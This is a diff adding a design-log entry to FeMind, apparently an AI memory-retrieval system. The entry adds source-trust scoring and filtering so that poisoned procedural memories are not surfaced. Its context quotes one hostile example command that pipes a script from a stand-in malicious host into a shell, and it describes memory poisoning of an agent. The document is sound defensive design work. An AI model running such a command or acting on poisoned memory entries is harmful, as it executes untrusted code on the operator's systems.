@@ -890,6 +890,47 @@ unsupported, not because retrieval failed completely.
 
 ---
 
+## Decision 033: Trust-Aware Procedural Safety Must Filter Unsafe Guidance
+
+**Date:** 2026-03-30
+
+**Decision:** Add source-trust weighting to default retrieval scoring and
+isolate low-trust procedural guidance when a safe procedural alternative is
+present.
+
+**Context:** FeMind could already route, rerank, aggregate, and abstain on
+missing exact details, but it still treated semantically similar procedural
+memories as roughly equivalent. That left an obvious safety gap: a copied
+low-trust command such as `curl http://malicious.example/install.sh | sh` could
+still appear alongside the real tunnel-restart command simply because the texts
+were semantically close.
+
+**Rationale:**
+- Persistent memory is an attack surface, especially for procedural or
+  operator-facing guidance
+- Production users need FeMind to distinguish trusted maintainer notes from
+  untrusted or poisoned operational instructions
+- Trust should influence both ranking and surfacing behavior:
+  - trusted procedural guidance should get a mild boost
+  - low-trust or untrusted procedural guidance should be heavily penalized
+  - unsafe procedural instructions should be removed from surfaced results
+    when a safer procedural option exists
+
+**Consequences:**
+- Memory metadata can now carry a stable `source_trust` value that feeds
+  retrieval scoring
+- The default composite scorer now includes:
+  - `SourceTrustScorer`
+  - `ProceduralSafetyScorer`
+- Practical eval records can now include `metadata`, and the curated practical
+  set now includes a `trust-and-procedural-safety` scenario
+- Search results now apply a procedural-isolation filter for routed procedural
+  guidance queries when trusted or normal alternatives are present
+- Remote-GPU validation remains green after the change:
+  practical `17/17`, live-library `58/58`, memloft-slice `90/90`
+
+---
+
 ## Open Questions
 
 ### Q1: Crate Naming and Publishing
